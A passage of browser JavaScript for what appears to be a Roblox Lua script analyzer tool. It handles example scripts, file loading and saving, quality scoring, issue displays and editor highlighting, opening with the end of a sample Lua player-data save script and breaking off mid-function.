    local copy = {}
    for key, value in pairs(original) do
        if type(value) == "table" then
            copy[key] = deepCopy(value)
        else
            copy[key] = value
        end
    end
    return copy
end

local function validatePlayerData(data)
    if type(data) ~= "table" then return false end
    if type(data.coins) ~= "number" or data.coins < 0 then return false end
    if type(data.level) ~= "number" or data.level < 1 then return false end
    if type(data.inventory) ~= "table" then return false end
    return true
end

local function loadPlayerData(player)
    local success, data = pcall(function()
        return playerDataStore:GetAsync(player.UserId)
    end)
    
    if success and data and validatePlayerData(data) then
        data.lastLogin = tick()
        playerDataCache[player.UserId] = data
        return data
    else
        local newData = deepCopy(defaultPlayerData)
        newData.lastLogin = tick()
        playerDataCache[player.UserId] = newData
        return newData
    end
end

local function savePlayerData(player)
    if not playerDataCache[player.UserId] then return end
    if pendingSaves[player.UserId] then return end
    
    pendingSaves[player.UserId] = true
    
    task.spawn(function()
        local success, errorMsg = pcall(function()
            playerDataStore:SetAsync(player.UserId, playerDataCache[player.UserId])
        end)
        
        if not success then
            warn("Failed to save data for " .. player.Name .. ": " .. errorMsg)
        end
        
        pendingSaves[player.UserId] = nil
    end)
end

local function getPlayerData(player)
    return playerDataCache[player.UserId] or loadPlayerData(player)
end

local function updatePlayerData(player, key, value)
    local data = getPlayerData(player)
    if data and data[key] ~= nil then
        data[key] = value
        return true
    end
    return false
end

Players.PlayerAdded:Connect(function(player)
    loadPlayerData(player)
    
    player.AncestryChanged:Connect(function()
        if not player.Parent then
            savePlayerData(player)
            playerDataCache[player.UserId] = nil
        end
    end)
end)

Players.PlayerRemoving:Connect(function(player)
    savePlayerData(player)
end)

local autoSaveConnection = task.spawn(function()
    while true do
        task.wait(300)
        for userId, _ in pairs(playerDataCache) do
            local player = Players:GetPlayerByUserId(userId)
            if player then
                savePlayerData(player)
            end
        end
    end
end)

game:BindToClose(function()
    for userId, _ in pairs(playerDataCache) do
        local player = Players:GetPlayerByUserId(userId)
        if player then
            savePlayerData(player)
        end
    end
    task.wait(3)
end)`
            }
        ];

        const modal = createExampleModal(examples);
        document.body.appendChild(modal);
        
        modal.addEventListener('click', function(e) {
            if (e.target.classList.contains('example-btn')) {
                const index = parseInt(e.target.dataset.index);
                editor.setValue(examples[index].code);
                document.body.removeChild(modal);
                showNotification(`Loaded: ${examples[index].name}`, 'success');
            }
            if (e.target.classList.contains('modal-close') || e.target.classList.contains('example-modal')) {
                document.body.removeChild(modal);
            }
        });
    }

    function createExampleModal(examples) {
        const modal = document.createElement('div');
        modal.className = 'example-modal';
        modal.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10000;
        `;

        modal.innerHTML = `
            <div class="example-dialog" style="
                background: white;
                padding: 30px;
                border-radius: 12px;
                max-width: 600px;
                width: 90%;
                max-height: 80vh;
                overflow-y: auto;
                box-shadow: 0 20px 40px rgba(0,0,0,0.3);
            ">
                <h3 style="margin-top: 0; color: #2d3748;">Load Example Script</h3>
                <p style="color: #718096; margin-bottom: 20px;">Choose an example to demonstrate different analysis features:</p>
                
                <div class="example-list" style="display: grid; gap: 15px;">
                    ${examples.map((example, index) => `
                        <button class="example-btn" data-index="${index}" style="
                            padding: 15px;
                            border: 2px solid #e2e8f0;
                            background: white;
                            border-radius: 8px;
                            cursor: pointer;
                            transition: all 0.2s;
                            text-align: left;
                        ">
                            <div style="font-weight: bold; color: #2d3748; margin-bottom: 5px;">${example.name}</div>
                            <div style="color: #718096; font-size: 14px;">${example.description}</div>
                        </button>
                    `).join('')}
                </div>
                
                <div style="margin-top: 20px; text-align: right;">
                    <button class="modal-close" style="
                        padding: 10px 20px;
                        background: #e53e3e;
                        color: white;
                        border: none;
                        border-radius: 6px;
                        cursor: pointer;
                    ">Cancel</button>
                </div>
            </div>
        `;

        return modal;
    }

    function loadFromFile() {
        fileInput.click();
    }

    function saveCurrentScript() {
        const script = editor.getValue();
        if (!script.trim()) {
            showNotification('No script to save', 'warning');
            return;
        }

        const filename = prompt('Enter filename (without extension):', 'roblox-script');
        if (!filename) return;

        const blob = new Blob([script], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `${filename}.lua`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
        
        showNotification('Script saved successfully!', 'success');
    }

    
    fileInput.addEventListener('change', function(e) {
        const file = e.target.files[0];
        if (!file) return;

        
        if (file.size > 1024 * 1024) {
            showNotification('File too large. Maximum size is 1MB.', 'warning');
            return;
        }

        
        const validTypes = ['.lua', '.luau', '.txt'];
        const fileExtension = '.' + file.name.split('.').pop().toLowerCase();
        if (!validTypes.includes(fileExtension)) {
            showNotification('Invalid file type. Please select a .lua, .luau, or .txt file.', 'warning');
            return;
        }

        const reader = new FileReader();
        reader.onload = function(e) {
            const content = e.target.result;
            
            
            if (editor.getValue().trim() && !confirm('Loading this file will replace current content. Continue?')) {
                return;
            }
            
            editor.setValue(content);
            hideResults();
            currentResults = null;
            showNotification(`File "${file.name}" loaded successfully!`, 'success');
        };
        
        reader.onerror = function() {
            showNotification('Error reading file. Please try again.', 'warning');
        };
        
        reader.readAsText(file);
        
        
        fileInput.value = '';
    });

    
    function createNewScript() {
        if (editor.getValue().trim() && !confirm('Create new script? Current work will be lost.')) {
            return;
        }
        
        const template = `-- New Roblox Script
-- Generated by Roblox Script Analyzer

local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- Your code here
print("Hello, " .. player.Name .. "!")`;

        editor.setValue(template);
        hideResults();
        currentResults = null;
        showNotification('New script created!', 'success');
    }

    function duplicateScript() {
        const script = editor.getValue();
        if (!script.trim()) {
            showNotification('No script to duplicate', 'warning');
            return;
        }

        const duplicated = `-- Duplicated Script
-- Original created: ${new Date().toLocaleString()}

${script}`;

        saveScriptWithContent(duplicated, 'duplicated-script');
    }

    function saveScriptWithContent(content, defaultName) {
        const filename = prompt('Enter filename (without extension):', defaultName);
        if (!filename) return;

        const blob = new Blob([content], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `${filename}.lua`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
        
        return true;
    }
    
    function displayResults(results) {
        currentResults = results;
        
        try {
            
            const health = analyzeCodeHealth(results);
            
            
            document.getElementById('lineCount').textContent = results.lineCount;
            document.getElementById('commentCount').textContent = results.commentCount;
            document.getElementById('nestingLevel').textContent = results.nestingLevel;
            
            const totalIssues = health.issues.security + health.issues.deprecations + 
                               health.issues.api + health.issues.performance + health.issues.quality;
            
            document.getElementById('totalIssues').textContent = totalIssues;
            
            
            updateScoreDisplay(health.overallScore, health);
        } catch (error) {
            console.error('Error in displayResults:', error);
            
            const basicScore = calculateOverallScore(results);
            
            
            document.getElementById('lineCount').textContent = results.lineCount;
            document.getElementById('commentCount').textContent = results.commentCount;
            document.getElementById('nestingLevel').textContent = results.nestingLevel;
            
            const totalIssues = (results.deprecations?.length || 0) +
                               (results.securityIssues?.length || 0) +
                               (results.apiIssues?.length || 0) +
                               (results.inefficiencies?.length || 0) +
                               (results.lintIssues?.length || 0);
            
            document.getElementById('totalIssues').textContent = totalIssues;
            
            
            updateScoreDisplay(basicScore);
        }
        
        displayIssues('securityList', 'securityCount', results.securityIssues || []);
        displayIssues('deprecationsList', 'deprecationCount', results.deprecations || []);
        displayIssues('apiIssuesList', 'apiCount', results.apiIssues || []);
        displayIssues('inefficienciesList', 'inefficiencyCount', results.inefficiencies || []);
        displayIssues('lintIssuesList', 'lintCount', results.lintIssues || []);
        
        displayDetailedCodeQuality(results);
        highlightIssuesInEditor(results);
        
        
        if (!results.parseSuccess) {
            if (results.parseErrors && results.parseErrors.length > 0) {
                showNotification('Using fallback analysis - some complex syntax not fully parsed', 'warning');
            } else {
                showNotification('Using fallback analysis due to parsing complexities', 'warning');
            }
        } else if (results.parseErrors && results.parseErrors.length > 0) {
            showNotification('Analysis completed with relaxed parsing settings', 'info');
            if (results.note) {
            }
        } else {
            showNotification('Analysis completed successfully!', 'success');
        }

        
        if (results.parseErrors && results.parseErrors.length > 0) {
            addParsingInfoToResults(results);
        }
    }

    function addParsingInfoToResults(results) {
        
        const resultsSection = document.getElementById('resultsSection');
        let infoPanel = document.getElementById('parsing-info-panel');
        
        if (!infoPanel) {
            infoPanel = document.createElement('div');
            infoPanel.id = 'parsing-info-panel';
            infoPanel.style.cssText = `
                background: #ebf8ff;
                border: 1px solid #bee3f8;
                border-radius: 6px;
                padding: 12px;
                margin: 10px 0;
                font-size: 14px;
                color: #2c5282;
            `;
            
            const resultsHeader = resultsSection.querySelector('.results-header');
            resultsHeader.insertAdjacentElement('afterend', infoPanel);
        }
        
        let message = '';
        if (!results.parseSuccess) {
            message = `📝 <strong>Parsing Info:</strong> Complex Lua syntax detected. Using comprehensive fallback analysis to ensure accurate results.`;
        } else if (results.note) {
            message = `📝 <strong>Parsing Info:</strong> ${results.note}`;
        }
        
        if (results.parseErrors && results.parseErrors.length > 0) {
            message += ` <a href="#" onclick="return false;" style="color: #3182ce;">View technical details</a>`;
        }
        
        infoPanel.innerHTML = message;
        
        
        setTimeout(() => {
            if (infoPanel.parentNode) {
                infoPanel.style.transition = 'opacity 0.5s ease';
                infoPanel.style.opacity = '0';
                setTimeout(() => {
                    if (infoPanel.parentNode) {
                        infoPanel.parentNode.removeChild(infoPanel);
                    }
                }, 500);
            }
        }, 10000);
    }
    
    function calculateOverallScore(results) {
        let score = 100;
        
        const securityIssues = results.securityIssues?.length || 0;
        const deprecations = results.deprecations?.length || 0;
        const apiIssues = results.apiIssues?.length || 0;
        const inefficiencies = results.inefficiencies?.length || 0;
        const lintIssues = results.lintIssues?.length || 0;
        
        score -= securityIssues * 15;
        score -= deprecations * 8;
        score -= apiIssues * 5;
        score -= inefficiencies * 3;
        score -= lintIssues * 2;
        
        if (results.commentCount > 0 && results.lineCount > 0) {
            const commentRatio = results.commentCount / results.lineCount;
            if (commentRatio > 0.1) score += 5;
        }
        
        if (results.nestingLevel <= 3) score += 3;
        
        return Math.max(0, Math.min(100, Math.round(score)));
    }
    
    function updateScoreDisplay(score, health = null) {
        const scoreElement = document.getElementById('overallScore');
        const descElement = document.getElementById('scoreDescription');
        const circleElement = document.getElementById('scoreCircle');
        
        scoreElement.textContent = score;
        
        let description, gradient;
        
        
        if (health && health.recommendations.length > 0) {
            const topPriority = health.recommendations[0];
            const trend = getHealthTrend();
            const trendEmoji = trend === 'improving' ? '📈' : trend === 'declining' ? '📉' : '➡️';
            
            if (score >= 90) {
                description = `Excellent code quality! ${trendEmoji} Focus on ${topPriority.category.toLowerCase()} for perfection.`;
                gradient = "conic-gradient(from 0deg, #38a169 0deg, #68d391 " + (score * 3.6) + "deg, rgba(45, 55, 72, 0.3) " + (score * 3.6) + "deg)";
            } else if (score >= 75) {
                description = `Good quality ${trendEmoji} Priority: ${topPriority.category.toLowerCase()} improvements.`;
                gradient = "conic-gradient(from 0deg, #3182ce 0deg, #63b3ed " + (score * 3.6) + "deg, rgba(45, 55, 72, 0.3) " + (score * 3.6) + "deg)";
            } else if (score >= 50) {
                description = `Moderate quality ${trendEmoji} Start with ${topPriority.category.toLowerCase()} issues.`;
                gradient = "conic-gradient(from 0deg, #ed8936 0deg, #f6ad55 " + (score * 3.6) + "deg, rgba(45, 55, 72, 0.3) " + (score * 3.6) + "deg)";
            } else {
                description = `Needs work ${trendEmoji} Critical: ${topPriority.category.toLowerCase()} issues first.`;
                gradient = "conic-gradient(from 0deg, #e53e3e 0deg, #fc8181 " + (score * 3.6) + "deg, rgba(45, 55, 72, 0.3) " + (score * 3.6) + "deg)";
            }
        } else {
            
            if (score >= 90) {
                description = "Excellent! Your code follows best practices.";
                gradient = "conic-gradient(from 0deg, #38a169 0deg, #68d391 " + (score * 3.6) + "deg, rgba(45, 55, 72, 0.3) " + (score * 3.6) + "deg)";
            } else if (score >= 75) {
                description = "Good code quality with minor improvements needed.";
                gradient = "conic-gradient(from 0deg, #3182ce 0deg, #63b3ed " + (score * 3.6) + "deg, rgba(45, 55, 72, 0.3) " + (score * 3.6) + "deg)";
            } else if (score >= 50) {
                description = "Moderate quality. Several improvements recommended.";
                gradient = "conic-gradient(from 0deg, #ed8936 0deg, #f6ad55 " + (score * 3.6) + "deg, rgba(45, 55, 72, 0.3) " + (score * 3.6) + "deg)";
            } else {
                description = "Significant improvements needed for better code quality.";
                gradient = "conic-gradient(from 0deg, #e53e3e 0deg, #fc8181 " + (score * 3.6) + "deg, rgba(45, 55, 72, 0.3) " + (score * 3.6) + "deg)";
            }
        }
        
        descElement.textContent = description;
        circleElement.style.background = gradient;
        
        
        if (health) {
            circleElement.style.cursor = 'pointer';
            circleElement.onclick = () => showHealthDetails(health);
        }
    }

    function showHealthDetails(health) {
        const modal = createHealthModal(health);
        document.body.appendChild(modal);
        
        modal.addEventListener('click', function(e) {
            if (e.target.classList.contains('modal-close') || e.target.classList.contains('health-modal')) {
                document.body.removeChild(modal);
            }
        });
    }

    function createHealthModal(health) {
        const trend = getHealthTrend();
        const trendIcon = trend === 'improving' ? '📈' : trend === 'declining' ? '📉' : '➡️';
        
        const modal = document.createElement('div');
        modal.className = 'health-modal';
        modal.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10000;
        `;

        modal.innerHTML = `
            <div class="health-dialog" style="
                background: white;
                padding: 30px;
                border-radius: 12px;
                max-width: 600px;
                width: 90%;
                max-height: 80vh;
                overflow-y: auto;
                box-shadow: 0 20px 40px rgba(0,0,0,0.3);
            ">
                <h3 style="margin-top: 0; color: #2d3748;">📊 Code Health Details</h3>
                
                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin: 20px 0;">
                    <div style="text-align: center;">
                        <div style="font-size: 36px; font-weight: bold; color: ${health.overallScore >= 80 ? '#38a169' : health.overallScore >= 60 ? '#ed8936' : '#e53e3e'};">
                            ${health.overallScore}/100
                        </div>
                        <div style="color: #718096;">Overall Score</div>
                    </div>
                    <div style="text-align: center;">
                        <div style="font-size: 24px;">${trendIcon}</div>
                        <div style="color: #718096; text-transform: capitalize;">${trend}</div>
                    </div>
                </div>

                <div style="margin: 20px 0;">
                    <h4 style="color: #2d3748; margin-bottom: 10px;">Issue Breakdown:</h4>
                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(120px, 1fr)); gap: 10px;">
                        <div style="text-align: center; padding: 10px; background: #fed7d7; border-radius: 6px;">
                            <div style="font-weight: bold;">🔒 ${health.issues.security}</div>
                            <div style="font-size: 12px;">Security</div>
                        </div>
                        <div style="text-align: center; padding: 10px; background: #fbb6ce; border-radius: 6px;">
                            <div style="font-weight: bold;">⚠️ ${health.issues.deprecations}</div>
                            <div style="font-size: 12px;">Deprecations</div>
                        </div>
                        <div style="text-align: center; padding: 10px; background: #fbd38d; border-radius: 6px;">
                            <div style="font-weight: bold;">🔧 ${health.issues.api}</div>
                            <div style="font-size: 12px;">API</div>
                        </div>
                        <div style="text-align: center; padding: 10px; background: #bee3f8; border-radius: 6px;">
                            <div style="font-weight: bold;">⚡ ${health.issues.performance}</div>
                            <div style="font-size: 12px;">Performance</div>
                        </div>
                        <div style="text-align: center; padding: 10px; background: #c6f6d5; border-radius: 6px;">
                            <div style="font-weight: bold;">✨ ${health.issues.quality}</div>
                            <div style="font-size: 12px;">Quality</div>
                        </div>
                    </div>
                </div>

                ${health.recommendations.length > 0 ? `
                    <div style="margin: 20px 0;">
                        <h4 style="color: #2d3748; margin-bottom: 10px;">💡 Top Recommendations:</h4>
                        ${health.recommendations.slice(0, 3).map(rec => `
                            <div style="margin: 10px 0; padding: 15px; background: #f7fafc; border-left: 4px solid ${rec.priority === 'high' ? '#e53e3e' : '#ed8936'}; border-radius: 4px;">
                                <div style="font-weight: bold; color: #2d3748;">${rec.category}</div>
                                <div style="color: #718096; margin: 5px 0;">${rec.message}</div>
                                <div style="font-size: 12px; color: #a0aec0;">Priority: ${rec.priority}</div>
                            </div>
                        `).join('')}
                    </div>
                ` : ''}

                <div style="margin-top: 20px; text-align: right;">
                    <button class="modal-close" style="
                        padding: 10px 20px;
                        background: #4299e1;
                        color: white;
                        border: none;
                        border-radius: 6px;
                        cursor: pointer;
                    ">Close</button>
                </div>
            </div>
        `;

        return modal;
    }
    
    function displayIssues(listId, countId, issues) {
        const list = document.getElementById(listId);
        const count = document.getElementById(countId);
        const category = list.closest('.issue-category');
        
        list.innerHTML = '';
        count.textContent = issues.length;
        
        if (issues.length === 0) {
            const li = document.createElement('li');
            li.textContent = '✅ No issues found';
            li.className = 'no-issues';
            list.appendChild(li);
            category.style.opacity = '0.6';
        } else {
            category.style.opacity = '1';
            
            issues.forEach((issue, index) => {
                const li = document.createElement('li');
                li.style.animationDelay = `${index * 0.1}s`;
                li.classList.add('fadeInUp');
                
                let content = `<div class="issue-header">`;
                content += `<strong>Line ${issue.line}:</strong> ${issue.message}`;
                
                if (issue.severity) {
                    const severityClass = issue.severity === 'high' ? 'severity-high' : 
                                         issue.severity === 'medium' ? 'severity-medium' : 'severity-low';
                    content += ` <span class="${severityClass}">[${issue.severity.toUpperCase()}]</span>`;
                }
                content += `</div>`;
                
                if (issue.suggestion) {
                    content += `<div class="issue-suggestion"><em>💡 Suggestion: ${issue.suggestion}</em></div>`;
                }
                
                if (issue.docUrl) {
                    content += `<div class="issue-docs">📖 <a href="${issue.docUrl}" target="_blank" rel="noopener">View Documentation</a></div>`;
                }
                
                if (issue.lastVerified) {
                    content += `<div class="issue-meta"><small>Last verified: ${issue.lastVerified}</small></div>`;
                }
                
                if (issue.code && issue.code !== `Line ${issue.line}`) {
                    content += `<div class="issue-code"><code>${issue.code}</code></div>`;
                }
                
                li.innerHTML = content;
                list.appendChild(li);
            });
        }
        
        if (issues.length === 0) {
            const collapseBtn = category.querySelector('.collapse-btn');
            if (collapseBtn && !list.classList.contains('collapsed')) {
                collapseBtn.click();
            }
        }
    }

    function displayDetailedCodeQuality(results) {
        const allIssues = collectAllIssues(results);
        const lineRatings = calculateLineRatings(allIssues, results.lineCount);
        const scriptContent = editor.getValue();
        
        displayLineByLineAnalysis(lineRatings, allIssues, scriptContent);
    }

    function collectAllIssues(results) {
        const issues = [];
        
        [results.securityIssues || [], results.deprecations || [], results.apiIssues || [], 
         results.inefficiencies || [], results.lintIssues || []].forEach((categoryIssues, categoryIndex) => {
            const categories = ['security', 'deprecation', 'api', 'performance', 'quality'];
            const severityWeights = { high: 25, medium: 15, low: 5 };
            
            categoryIssues.forEach(issue => {
                issues.push({
                    ...issue,
                    category: categories[categoryIndex],
                    weight: severityWeights[issue.severity] || 10
                });
            });
        });
        
        return issues;
    }

    function calculateLineRatings(allIssues, totalLines) {
        const lineRatings = {};
        
        for (let i = 1; i <= totalLines; i++) {
            lineRatings[i] = {
                score: 100,
                issues: [],
                category: 'good'
            };
        }
        
        allIssues.forEach(issue => {
            const lineNum = parseInt(issue.line);
            if (lineRatings[lineNum]) {
                lineRatings[lineNum].score -= issue.weight;
                lineRatings[lineNum].issues.push(issue);
            }
        });
        
        Object.keys(lineRatings).forEach(lineNum => {
            const rating = lineRatings[lineNum];
            rating.score = Math.max(0, rating.score);
            
            if (rating.score >= 80) rating.category = 'excellent';
            else if (rating.score >= 60) rating.category = 'good';
            else if (rating.score >= 40) rating.category = 'warning';
            else rating.category = 'critical';
        });
        
        return lineRatings;
    }

    function displayLineByLineAnalysis(lineRatings, allIssues, scriptContent, minRating = 70) {
        const problemLines = Object.entries(lineRatings)
            .filter(([lineNum, rating]) => rating.score < minRating)
            .sort(([,a], [,b]) => a.score - b.score);
        
        if (problemLines.length === 0) {
            displayExcellentCodeMessage();
            return;
        }

        createDetailedQualitySection(problemLines, scriptContent, minRating);
    }

    function displayExcellentCodeMessage() {
        const resultsSection = document.getElementById('resultsSection');
        let qualitySection = document.getElementById('detailed-quality-section');
        
        if (qualitySection) {
            qualitySection.remove();
        }
        
        qualitySection = document.createElement('div');
        qualitySection.id = 'detailed-quality-section';
        qualitySection.className = 'detailed-quality-section';
        qualitySection.style.cssText = `
            background: linear-gradient(135deg, #d6f5d6 0%, #b8e6b8 100%);
            border: 2px solid #38a169;
            border-radius: 12px;
            padding: 30px;
            margin: 20px 0;
            text-align: center;
            box-shadow: 0 4px 12px rgba(56, 161, 105, 0.2);
        `;
        
        qualitySection.innerHTML = `
            <div style="font-size: 48px; margin-bottom: 20px;">🏆</div>
            <h3 style="color: #2d3748; margin-bottom: 15px;">Excellent Code Quality!</h3>
            <p style="color: #4a5568; font-size: 16px; line-height: 1.5;">
                Your code meets high quality standards with no significant issues detected.
                All lines score above the quality threshold.
            </p>
        `;
        
        resultsSection.appendChild(qualitySection);
    }

    function createDetailedQualitySection(problemLines, scriptContent, minRating) {
        const resultsSection = document.getElementById('resultsSection');
        let qualitySection = document.getElementById('detailed-quality-section');
        
        if (qualitySection) {
            qualitySection.remove();
        }
        
        qualitySection = document.createElement('div');
        qualitySection.id = 'detailed-quality-section';
        qualitySection.className = 'detailed-quality-section';
        qualitySection.style.cssText = `
            background: #f7fafc;
            border: 1px solid #e2e8f0;
            border-radius: 12px;
            padding: 20px;
            margin: 20px 0;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
        `;
        
        const lines = scriptContent.split('\n');
        
        qualitySection.innerHTML = `
            <div class="quality-header" style="margin-bottom: 20px;">
                <h3 style="color: #2d3748; margin-bottom: 10px;">
                    📊 Detailed Code Quality Analysis
                </h3>
                <p style="color: #718096; font-size: 14px;">
                    Lines scoring below ${minRating}/100 with detailed explanations:
                </p>
                <div style="margin: 15px 0; padding: 10px; background: #ffd6cc; border-radius: 6px; font-size: 14px;">
                    <strong>${problemLines.length}</strong> lines need attention out of <strong>${lines.length}</strong> total lines
                </div>
            </div>
            
            <div class="quality-lines">
                ${problemLines.map(([lineNum, rating]) => {
                    const lineContent = lines[parseInt(lineNum) - 1] || '';
                    return createLineQualityCard(lineNum, rating, lineContent.trim());
                }).join('')}
            </div>
        `;
        
        resultsSection.appendChild(qualitySection);
    }

    function createLineQualityCard(lineNum, rating, lineContent) {
        const categoryColors = {
            'excellent': '#38a169',
            'good': '#3182ce',
            'warning': '#ed8936',
            'critical': '#e53e3e'
        };
        
        const categoryIcons = {
            'excellent': '✅',
            'good': '👍',
            'warning': '⚠️',
            'critical': '🚨'
        };
        
        const color = categoryColors[rating.category];
        const icon = categoryIcons[rating.category];
        
        return `
            <div class="line-quality-card" style="
                border: 2px solid ${color};
                border-radius: 8px;
                margin: 15px 0;
                padding: 15px;
                background: white;
                box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            ">
                <div class="line-header" style="
                    display: flex;
                    align-items: center;
                    justify-content: space-between;
                    margin-bottom: 15px;
                ">
                    <div style="display: flex; align-items: center; gap: 10px;">
                        <span style="
                            background: ${color};
                            color: white;
                            padding: 4px 8px;
                            border-radius: 4px;
                            font-weight: bold;
                            font-size: 12px;
                        ">Line ${lineNum}</span>
                        <span style="font-size: 20px;">${icon}</span>
                    </div>
                    <div style="
                        font-size: 24px;
                        font-weight: bold;
                        color: ${color};
                    ">
                        ${rating.score}/100
                    </div>
                </div>
                
                <div class="line-code" style="
                    background: #2d3748;
                    color: #e2e8f0;
                    padding: 12px;
                    border-radius: 6px;
                    font-family: 'Monaco', 'Menlo', monospace;
                    font-size: 14px;
                    margin-bottom: 15px;
                    overflow-x: auto;
                ">
                    <code>${lineContent || '(empty line)'}</code>
                </div>
                
                <div class="line-issues">
                    <h4 style="color: #2d3748; margin-bottom: 10px; font-size: 16px;">
                        Issues Found (${rating.issues.length}):
                    </h4>
                    ${rating.issues.map(issue => `
                        <div class="issue-detail" style="
                            background: #fed7d7;
                            border-left: 4px solid #e53e3e;
                            padding: 12px;
                            margin: 8px 0;
                            border-radius: 4px;
                        ">
                            <div style="font-weight: bold; color: #2d3748; margin-bottom: 5px;">
                                ${getCategoryIcon(issue.category)} ${issue.message}
                            </div>
                            ${issue.suggestion ? `
                                <div style="color: #4a5568; font-style: italic; margin-top: 8px;">
                                    💡 <strong>Suggestion:</strong> ${issue.suggestion}
                                </div>
                            ` : ''}
                            <div style="
                                display: flex;
                                justify-content: space-between;
                                align-items: center;
                                margin-top: 10px;
                                font-size: 12px;
                                color: #718096;
                            ">
                                <span>Category: ${issue.category.toUpperCase()}</span>
                                <span>Impact: -${issue.weight} points</span>
                            </div>
                        </div>
                    `).join('')}
                </div>
                
                <div class="line-recommendations" style="
                    background: #e6fffa;
                    border: 1px solid #81e6d9;
                    border-radius: 6px;
                    padding: 12px;
                    margin-top: 15px;
                ">
                    <h5 style="color: #2d3748; margin-bottom: 8px;">Improvement Recommendations:</h5>
                    ${generateLineRecommendations(rating.issues)}
                </div>
            </div>
        `;
    }

    function getCategoryIcon(category) {
        const icons = {
            'security': '🔒',
            'deprecation': '⚠️',
            'api': '🔧',
            'performance': '⚡',
            'quality': '✨'
        };
        return icons[category] || '❓';
    }

    function generateLineRecommendations(issues) {
        const recommendations = new Set();
        
        issues.forEach(issue => {
            switch (issue.category) {
                case 'security':
                    recommendations.add('• Implement server-side validation');
                    recommendations.add('• Use secure coding practices');
                    break;
                case 'deprecation':
                    recommendations.add('• Update to modern API alternatives');
                    recommendations.add('• Check Roblox documentation for latest practices');
                    break;
                case 'performance':
                    recommendations.add('• Optimize for better performance');
                    recommendations.add('• Consider caching frequently accessed values');
                    break;
                case 'api':
                    recommendations.add('• Follow Roblox API best practices');
                    recommendations.add('• Use proper service access patterns');
                    break;
                case 'quality':
                    recommendations.add('• Improve code structure and readability');
                    recommendations.add('• Consider refactoring for maintainability');
                    break;
            }
        });
        
        return Array.from(recommendations).slice(0, 3).join('<br>') || '• No specific recommendations available';
    }

    function highlightIssuesInEditor(results) {
        clearEditorHighlights();
        
        const allIssues = collectAllIssues(results);
        if (allIssues.length === 0) return;
        
        createHighlightStyles();
        highlightIssueLines(allIssues);
        addGutterMarkers(allIssues);
        setupEditorInteractions(allIssues);
    }

    function clearEditorHighlights() {
        issueMarkers.forEach(marker => marker.clear());
        issueMarkers = [];
        
        if (issueTooltip) {
            issueTooltip.remove();
            issueTooltip = null;
        }
        
        editor.clearGutter("issue-gutter");
    }

    function createHighlightStyles() {
        let styleElement = document.getElementById('editor-highlight-styles');
        if (styleElement) return;
        
        styleElement = document.createElement('style');
        styleElement.id = 'editor-highlight-styles';
        styleElement.textContent = `
            .issue-critical { 
                background-color: rgba(229, 62, 62, 0.2) !important;
                border-bottom: 2px solid #e53e3e;
            }
            .issue-warning { 
                background-color: rgba(237, 137, 54, 0.2) !important;
                border-bottom: 2px solid #ed8936;
            }
            .issue-security { 
                background-color: rgba(245, 101, 101, 0.25) !important;
                border-left: 4px solid #f56565;
            }
            .issue-deprecation { 
                background-color: rgba(251, 211, 141, 0.25) !important;
                border-left: 4px solid #fbd38d;
            }
            .issue-performance { 
                background-color: rgba(99, 179, 237, 0.2) !important;
                border-left: 4px solid #63b3ed;
            }
            .issue-api { 
                background-color: rgba(129, 230, 217, 0.2) !important;
                border-left: 4px solid #81e6d9;
            }
            .issue-quality { 
                background-color: rgba(196, 181, 253, 0.2) !important;
                border-left: 4px solid #c4b5fd;
            }
            
            .issue-gutter-marker {
                display: inline-block;
                width: 16px;
                height: 16px;
                border-radius: 50%;
                cursor: pointer;
                font-size: 10px;
                text-align: center;
                line-height: 16px;
                font-weight: bold;
                color: white;
                margin-left: 2px;
            }
            
            .issue-critical-marker { background-color: #e53e3e; }
            .issue-warning-marker { background-color: #ed8936; }
            .issue-security-marker { background-color: #f56565; }
            .issue-deprecation-marker { background-color: #fbd38d; color: #2d3748; }
            .issue-performance-marker { background-color: #4299e1; }
            .issue-api-marker { background-color: #38b2ac; }
            .issue-quality-marker { background-color: #9f7aea; }
            
            .issue-tooltip {
                position: absolute;
                background: #2d3748;
                color: white;
                border-radius: 8px;
                padding: 15px;
                max-width: 400px;
                box-shadow: 0 10px 30px rgba(0,0,0,0.3);
                z-index: 10000;
                font-size: 13px;
                line-height: 1.4;
                border: 1px solid #4a5568;
            }
            
            .issue-tooltip::before {
                content: '';
                position: absolute;
                top: -8px;
                left: 20px;
                width: 0;
                height: 0;
                border-left: 8px solid transparent;
                border-right: 8px solid transparent;
                border-bottom: 8px solid #2d3748;
            }
            
            .tooltip-header {
                font-weight: bold;
                margin-bottom: 8px;
                display: flex;
                align-items: center;
                gap: 8px;
            }
            
            .tooltip-category {
                background: rgba(255,255,255,0.2);
                padding: 2px 8px;
                border-radius: 12px;
                font-size: 11px;
                text-transform: uppercase;
            }
            
            .tooltip-message {
                margin-bottom: 10px;
                color: #e2e8f0;
            }
            
            .tooltip-suggestion {
                background: rgba(72, 187, 120, 0.2);
                padding: 8px;
                border-radius: 4px;
                margin-top: 8px;
                border-left: 3px solid #48bb78;
            }
            
            .tooltip-suggestion-header {
                font-weight: bold;
                color: #68d391;
                margin-bottom: 4px;
                font-size: 12px;
            }
            
            .tooltip-actions {
                margin-top: 12px;
                padding-top: 8px;
                border-top: 1px solid #4a5568;
                display: flex;
                gap: 8px;
            }
            
            .tooltip-action-btn {
                background: #4299e1;
                color: white;
                border: none;
                padding: 4px 8px;
                border-radius: 4px;
                font-size: 11px;
                cursor: pointer;
                transition: background-color 0.2s;
            }
            
            .tooltip-action-btn:hover {
                background: #3182ce;
            }
        `;
        
        document.head.appendChild(styleElement);
    }

    function highlightIssueLines(allIssues) {
        const issuesByLine = {};
        
        allIssues.forEach(issue => {
